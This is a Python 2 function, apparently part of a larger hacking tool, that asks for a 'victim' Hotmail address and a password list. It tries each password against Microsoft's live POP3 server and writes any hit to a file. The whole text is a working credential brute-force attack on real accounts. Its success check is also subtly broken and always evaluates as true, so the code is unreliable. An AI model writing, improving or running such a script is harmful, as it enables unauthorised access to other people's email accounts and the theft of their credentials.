def hotmail():
	user = raw_input("[+] Victim Hotmail: ")
	passlist= raw_input("[+] Password List [pass.txt]: ")
	fn = open (passlist, "r")
	counting = fn.readlines()
	print "[+] Worldlist Length: %s " % len(counting)
	host = 'pop3.live.com'
	port = 995
	server = poplib.POP3_SSL(host, port)
	print "Start cracking using hotmail server.....\n\r"
	time.sleep(2)
	fn = open (passlist, 'r')
	for pass_file in fn:
		print "[+] Trying: {0}".format(pass_file)+"\n\r"
		pwd = pass_file[:-1]
		try:
			x = server.user(user)
			yy = server.pass_(pwd)
			if(yy == '+OK' or 'POP disabled'):
				print "> Correct Password have been found....!\n\r"
				time.sleep(2)
				print "Email: {0}".format(user)+"\n\r"
				print "Password is: {0}".format(pwd)+"\n\r\n\r\n\r"
				server.quit()
				fn.close()
				fw = open('Hotmail.txt','w')
				fw.write(user+': '+pwd)
				fw.close()
				print "Email and Password saved in Hotmail.txt file.\n\r"
				exit()
		except poplib.error_proto:
			continue
